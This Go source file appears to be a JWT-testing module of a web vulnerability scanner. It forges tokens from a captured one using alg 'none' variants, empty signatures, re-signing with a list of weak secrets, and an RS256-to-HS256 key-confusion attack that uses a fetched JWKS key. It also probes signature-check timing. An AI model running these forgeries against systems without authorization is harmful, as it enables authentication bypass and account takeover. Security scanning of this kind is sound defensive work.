package modules

import (
	"crypto/hmac"
	"crypto/sha256"
	"crypto/sha512"
	"encoding/asn1"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"github.com/SentinelXofficial/sxel/pkg/core"
	"io"
	"math/big"
	"net/http"
	"net/url"
	"sort"
	"strings"
	"time"
)

func ScanJWT(client *http.Client, cfg *core.Config, target core.CrawlResult) []core.ScanResult {
	var results []core.ScanResult

	type candidate struct {
		src   string
		token string
	}
	var cands []candidate

	for k, v := range cfg.Headers {
		if strings.EqualFold(k, "authorization") {
			if tok, ok := extractBearer(v); ok && isJWT(tok) {
				cands = append(cands, candidate{"Authorization header", tok})
			}
		}
	}
	if cfg.Cookie != "" {
		for _, part := range strings.Split(cfg.Cookie, ";") {
			kv := strings.SplitN(strings.TrimSpace(part), "=", 2)
			if len(kv) == 2 {
				val := strings.TrimSpace(kv[1])
				if isJWT(val) {
					cands = append(cands, candidate{"cookie:" + strings.TrimSpace(kv[0]), val})
				}
			}
		}
	}

	if len(cands) == 0 {
		return nil
	}

	noAuthStatus := probeNoAuth(client, cfg, target.URL)

	for i, c := range cands {
		headerB64, payloadB64, _, ok := splitJWT(c.token)
		if !ok {
			continue
		}
		alg := jwtHeaderAlg(headerB64)
		fmt.Printf("  [JWT] Candidate in %s (alg=%s)\n", c.src, alg)

		try := func(modToken, vulnType, evidence string) {
			if res := testJWTToken(client, cfg, target.URL, c.src, c.token, modToken, noAuthStatus, vulnType, evidence); res != nil {
				results = append(results, *res)
			}
		}

		for _, variant := range []string{"none", "None", "NONE", "nOnE"} {
			try(
				buildJWT(jwtSetAlg(headerB64, variant), payloadB64, ""),
				"JWT Algorithm None Bypass",
				fmt.Sprintf("alg changed from %s → %q, signature stripped", alg, variant),
			)
		}

		if strings.EqualFold(alg, "RS256") {
			headerSeg := jwtSetAlg(headerB64, "HS256")
			signingInput := headerSeg + "." + payloadB64
			mac := hmac.New(sha256.New, []byte("secret"))
			mac.Write([]byte(signingInput))
			confSig := base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
			try(
				buildJWT(headerSeg, payloadB64, confSig),
				"JWT Algorithm Confusion (RS256→HS256)",
				"server accepted HS256 token when RS256 expected; HMAC key-confusion possible",
			)
		}

		try(
			buildJWT(headerB64, payloadB64, ""),
			"JWT Empty Signature Accepted",
			"server accepted JWT with empty signature segment",
		)

		if strings.HasPrefix(strings.ToUpper(alg), "HS") {
			weakSecrets := []string{
				"secret", "password", "123456", "qwerty", "admin", "token",
				"key", "jwt", "auth", "test", "changeme", "letmein",
				"your-256-bit-secret", "your-secret-key", "",
			}
			for _, sec := range weakSecrets {
				var sig string
				signingInput := headerB64 + "." + payloadB64
				switch strings.ToUpper(alg) {
				case "HS256":
					mac := hmac.New(sha256.New, []byte(sec))
					mac.Write([]byte(signingInput))
					sig = base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
				case "HS384":
					mac := hmac.New(sha512.New384, []byte(sec))
					mac.Write([]byte(signingInput))
					sig = base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
				case "HS512":
					mac := hmac.New(sha512.New, []byte(sec))
					mac.Write([]byte(signingInput))
					sig = base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
				default:
					continue
				}
				tok := buildJWT(headerB64, payloadB64, sig)
				if res := testJWTToken(client, cfg, target.URL, c.src, c.token, tok, noAuthStatus,
					"JWT Weak Secret",
					fmt.Sprintf("server accepted %s token re-signed with weak secret %q", alg, sec)); res != nil {
					results = append(results, *res)
					break
				}
			}
		}

		if strings.HasPrefix(strings.ToUpper(alg), "RS") {
			if pemKey, kid, modulus, okKey := discoverJWKSRSAKey(client, cfg, target.URL); okKey {
				headerSeg := jwtSetAlg(headerB64, "HS256")
				mac := hmac.New(sha256.New, modulus)
				mac.Write([]byte(headerSeg + "." + payloadB64))
				confSig := base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
				pemShort := pemKey
				if len(pemShort) > 96 {
					pemShort = pemShort[:96] + "..."
				}
				try(
					buildJWT(headerSeg, payloadB64, confSig),
					"JWT Algorithm Confusion (RS256→HS256, JWKS key)",
					fmt.Sprintf("server accepted HS256 token signed with the real JWKS RSA public key (kid=%s, modulus=%d bits, PEM: %s)",
						kid, len(modulus)*8, pemShort),
				)
			}
		}

		if i == 0 && noAuthStatus != 200 {
			leak, err := jwtTimingProbe(client, cfg, target.URL, c.token)
			if err != nil {
				fmt.Printf("  [JWT] Timing probe skipped: %v\n", err)
			} else if leak {
				results = append(results, core.ScanResult{
					Type:      "JWT Signature Validation Timing Leak",
					URL:       target.URL,
					Method:    "GET",
					Parameter: c.src,
					Payload:   "valid vs tampered signature latency comparison",
					Severity:  "LOW",
					Evidence:  "valid-token and tampered-token median latencies differ by >30% with an absolute delta >20ms (3 samples each, median-based): the endpoint's response timing reveals whether a JWT signature is valid",
					Timestamp: time.Now(),
				})
			}
		}
	}

	return results
}

func decodeJWTPart(s string) ([]byte, bool) {
	if data, err := base64.RawURLEncoding.DecodeString(s); err == nil {
		return data, true
	}
	if data, err := base64.URLEncoding.DecodeString(s); err == nil {
		return data, true
	}
	return nil, false
}

func isJWT(s string) bool {
	p := strings.Split(s, ".")
	if len(p) != 3 {
		return false
	}
	for _, seg := range p[:2] {
		if len(seg) == 0 {
			return false
		}
	}
	data, ok := decodeJWTPart(p[0])
	if !ok {
		return false
	}
	var m map[string]interface{}
	return json.Unmarshal(data, &m) == nil
}

func extractBearer(v string) (string, bool) {
	prefix := "bearer "
	if strings.HasPrefix(strings.ToLower(v), prefix) {
		return strings.TrimSpace(v[len(prefix):]), true
	}
	return "", false
}

func splitJWT(token string) (header, payload, sig string, ok bool) {
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return "", "", "", false
	}
	return parts[0], parts[1], parts[2], true
}

func jwtHeaderAlg(headerB64 string) string {
	data, ok := decodeJWTPart(headerB64)
	if !ok {
		return "unknown"
	}
	var m map[string]interface{}
	if err := json.Unmarshal(data, &m); err != nil {
		return "unknown"
	}
	if alg, ok := m["alg"].(string); ok {
		return alg
	}
	return "unknown"
}

func jwtSetAlg(headerB64, newAlg string) string {
	data, ok := decodeJWTPart(headerB64)
	if !ok {
		return headerB64
	}
	var m map[string]interface{}
	if err := json.Unmarshal(data, &m); err != nil {
		return headerB64
	}
	m["alg"] = newAlg
	newData, err := json.Marshal(m)
	if err != nil {
		return headerB64
	}
	return base64.RawURLEncoding.EncodeToString(newData)
}

func buildJWT(header, payload, sig string) string {
	return header + "." + payload + "." + sig
}

func probeNoAuth(client *http.Client, cfg *core.Config, targetURL string) int {
	noRedir := &http.Client{
		Timeout:   client.Timeout,
		Transport: client.Transport,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		return 0
	}
	core.ApplyHeaders(req, cfg)
	req.Header.Del("Authorization")
	for k, v := range cfg.Headers {
		if !strings.EqualFold(k, "authorization") {
			req.Header.Set(k, v)
		}
	}
	if cfg.Cookie != "" {
		var safe []string
		for _, part := range strings.Split(cfg.Cookie, ";") {
			kv := strings.SplitN(strings.TrimSpace(part), "=", 2)
			if len(kv) == 2 && !isJWT(strings.TrimSpace(kv[1])) {
				safe = append(safe, part)
			}
		}
		if len(safe) > 0 {
			req.Header.Set("Cookie", strings.Join(safe, "; "))
		} else {
			req.Header.Del("Cookie")
		}
	}
	resp, err := noRedir.Do(req)
	if err != nil {
		return 0
	}
	resp.Body.Close()
	return resp.StatusCode
}

func testJWTToken(
	client *http.Client, cfg *core.Config,
	targetURL, src, origToken, modToken string,
	noAuthStatus int,
	vulnType, evidence string,
) *core.ScanResult {
	if noAuthStatus == 200 {
		return nil
	}

	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		return nil
	}
	core.ApplyHeaders(req, cfg)

	if strings.HasPrefix(src, "cookie:") {
		cookieName := strings.TrimPrefix(src, "cookie:")
		req.Header.Del("Authorization")
		var cookieParts []string
		if cfg.Cookie != "" {
			for _, part := range strings.Split(cfg.Cookie, ";") {
				kv := strings.SplitN(strings.TrimSpace(part), "=", 2)
				if len(kv) == 2 {
					if strings.EqualFold(strings.TrimSpace(kv[0]), cookieName) {
						cookieParts = append(cookieParts, cookieName+"="+modToken)
					} else {
						cookieParts = append(cookieParts, strings.TrimSpace(part))
					}
				}
			}
		}
		req.Header.Set("Cookie", strings.Join(cookieParts, "; "))
	} else {
		req.Header.Set("Authorization", "Bearer "+modToken)
	}

	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	resp.Body.Close()

	if resp.StatusCode == 200 && noAuthStatus != 200 {
		display := modToken
		if len(display) > 80 {
			display = display[:80] + "..."
		}
		result := &core.ScanResult{
			Type:      vulnType,
			URL:       targetURL,
			Method:    "GET",
			Parameter: src,
			Payload:   display,
			Severity:  "HIGH",
			Evidence:  fmt.Sprintf("HTTP %d accepted (baseline without token: %d) — %s", resp.StatusCode, noAuthStatus, evidence),
			Timestamp: time.Now(),
		}
		return result
	}
	return nil
}

func discoverJWKSRSAKey(client *http.Client, cfg *core.Config, targetURL string) (pemKey, kid string, modulus []byte, ok bool) {
	parsed, err := url.Parse(targetURL)
	if err != nil || parsed.Scheme == "" || parsed.Host == "" {
		return "", "", nil, false
	}
	origin := parsed.Scheme + "://" + parsed.Host

	probe := *client
	if cfg.Timeout > 0 {
		probe.Timeout = time.Duration(cfg.Timeout) * time.Second
	}

	paths := []string{
		"/jwks.json",
		"/.well-known/jwks.json",
		"/oauth/jwks",
		"/api/jwks",
		"/.well-known/openid-configuration",
	}
	for _, p := range paths {
		raw := origin + p
		if p == "/.well-known/openid-configuration" {
			jwksURI, reachable := jwtFetchString(&probe, cfg, raw)
			if !reachable || jwksURI == "" {
				continue
			}
			if u, err := url.Parse(jwksURI); err == nil && !u.IsAbs() {
				jwksURI = origin + jwksURI
			}
			raw = jwksURI
		}
		body, err := jwtFetchBody(&probe, cfg, raw)
		if err != nil {
			continue
		}
		if pk, kd, mod, okKey := parseJWKS(body); okKey {
			fmt.Printf("  [JWT] JWKS RSA key found at %s (kid=%s)\n", raw, kd)
			return pk, kd, mod, true
		}
	}
	return "", "", nil, false
}

func jwtFetchBody(client *http.Client, cfg *core.Config, raw string) (string, error) {
	req, err := http.NewRequest("GET", raw, nil)
	if err != nil {
		return "", err
	}
	req.Header.Set("User-Agent", cfg.UserAgent)
	req.Header.Set("Accept", "application/json")
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		return "", fmt.Errorf("status %d", resp.StatusCode)
	}
	body, err := io.ReadAll(io.LimitReader(resp.Body, 4<<20))
	if err != nil {
		return "", err
	}
	return string(body), nil
}

func jwtFetchString(client *http.Client, cfg *core.Config, raw string) (string, bool) {
	body, err := jwtFetchBody(client, cfg, raw)
	if err != nil {
		return "", false
	}
	var doc map[string]interface{}
	if err := json.Unmarshal([]byte(body), &doc); err != nil {
		return "", false
	}
	u, ok := doc["jwks_uri"].(string)
	return u, ok
}

func parseJWKS(body string) (pemKey, kid string, modulus []byte, ok bool) {
	var jwks struct {
		Keys []struct {
			Kty string `json:"kty"`
			Kid string `json:"kid"`
			N   string `json:"n"`
			E   string `json:"e"`
		} `json:"keys"`
	}
	if err := json.Unmarshal([]byte(body), &jwks); err != nil {
		return "", "", nil, false
	}
	for _, k := range jwks.Keys {
		if !strings.EqualFold(k.Kty, "RSA") || k.N == "" || k.E == "" {
			continue
		}
		nb, okN := jwkModulusBytes(k.N)
		e, okE := jwkExponent(k.E)
		if !okN || !okE {
			continue
		}
		return jwkToRSAPublicKeyPEM(nb, e), k.Kid, nb, true
	}
	return "", "", nil, false
}

func jwkModulusBytes(n string) ([]byte, bool) {
	if b, err := base64.RawURLEncoding.DecodeString(n); err == nil {
		return b, true
	}
	if b, err := base64.URLEncoding.DecodeString(n); err == nil {
		return b, true
	}
	return nil, false
}

func jwkExponent(e string) (int, bool) {
	b, ok := decodeJWTPart(e)
	if !ok {
		return 0, false
	}
	v := new(big.Int).SetBytes(b).Int64()
	if v <= 0 || v > 1<<30 {
		return 0, false
	}
	return int(v), true
}

func jwkToRSAPublicKeyPEM(nb []byte, e int) string {
	der, err := asn1.Marshal(struct {
		Modulus  *big.Int
		Exponent int
	}{new(big.Int).SetBytes(nb), e})
	if err != nil {
		return ""
	}
	return string(pem.EncodeToMemory(&pem.Block{Type: "RSA PUBLIC KEY", Bytes: der}))
}

func jwtTimingProbe(client *http.Client, cfg *core.Config, targetURL, validToken string) (bool, error) {
	if !isJWT(validToken) {
		return false, fmt.Errorf("not a JWT")
	}
	headerB64, payloadB64, sigB64, ok := splitJWT(validToken)
	if !ok {
		return false, fmt.Errorf("malformed JWT")
	}
	tampered := buildJWT(headerB64, payloadB64, tamperJWTSignature(sigB64))

	probe := *client
	if cfg.Timeout > 0 {
		probe.Timeout = time.Duration(cfg.Timeout) * time.Second
	}

	const samples = 3
	var validSamples, tamperedSamples []time.Duration
	for i := 0; i < samples; i++ {
		d, okReq := jwtTimingRequest(&probe, cfg, targetURL, validToken)
		if !okReq {
			return false, fmt.Errorf("timing request failed (attempt %d)", i+1)
		}
		validSamples = append(validSamples, d)
		d, okReq = jwtTimingRequest(&probe, cfg, targetURL, tampered)
		if !okReq {
			return false, fmt.Errorf("timing request failed (attempt %d)", i+1)
		}
		tamperedSamples = append(tamperedSamples, d)
	}

	validMed := medianDuration(validSamples)
	tamperedMed := medianDuration(tamperedSamples)
	diff := validMed - tamperedMed
	if diff < 0 {
		diff = -diff
	}
	rel := 0.0
	if validMed > 0 {
		rel = float64(diff) / float64(validMed)
	}
	leak := diff > 20*time.Millisecond && rel > 0.30
	state := "no leak"
	if leak {
		state = "TIMING LEAK"
	}
	fmt.Printf("  [JWT] Timing probe: valid median %v vs tampered median %v (Δ %v, %d%% of valid) — %s\n",
		validMed.Round(time.Millisecond), tamperedMed.Round(time.Millisecond),
		diff.Round(time.Millisecond), int(rel*100), state)
	return leak, nil
}

func jwtTimingRequest(client *http.Client, cfg *core.Config, targetURL, token string) (time.Duration, bool) {
	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		return 0, false
	}
	req.Header.Set("User-Agent", cfg.UserAgent)
	for k, v := range cfg.Headers {
		if !strings.EqualFold(k, "authorization") {
			req.Header.Set(k, v)
		}
	}
	if cfg.Cookie != "" {
		var safe []string
		for _, part := range strings.Split(cfg.Cookie, ";") {
			kv := strings.SplitN(strings.TrimSpace(part), "=", 2)
			if len(kv) == 2 && !isJWT(strings.TrimSpace(kv[1])) {
				safe = append(safe, part)
			}
		}
		if len(safe) > 0 {
			req.Header.Set("Cookie", strings.Join(safe, "; "))
		}
	}
	req.Header.Set("Authorization", "Bearer "+token)
	t0 := time.Now()
	resp, err := client.Do(req)
	if err != nil {
		return 0, false
	}
	resp.Body.Close()
	return time.Since(t0), true
}

func tamperJWTSignature(sig string) string {
	if sig == "" {
		return "x"
	}
	b := []byte(sig)
	last := b[len(b)-1]
	var alt byte
	switch {
	case last >= 'A' && last <= 'Z':
		alt = 'A' + (last-'A'+1)%26
	case last >= 'a' && last <= 'z':
		alt = 'a' + (last-'a'+1)%26
	case last >= '0' && last <= '9':
		alt = '0' + (last-'0'+1)%10
	default:
		alt = 'A'
	}
	b[len(b)-1] = alt
	return string(b)
}

func medianDuration(ds []time.Duration) time.Duration {
	if len(ds) == 0 {
		return 0
	}
	s := make([]time.Duration, len(ds))
	copy(s, ds)
	sort.Slice(s, func(i, j int) bool { return s[i] < s[j] })
	return s[len(s)/2]
}
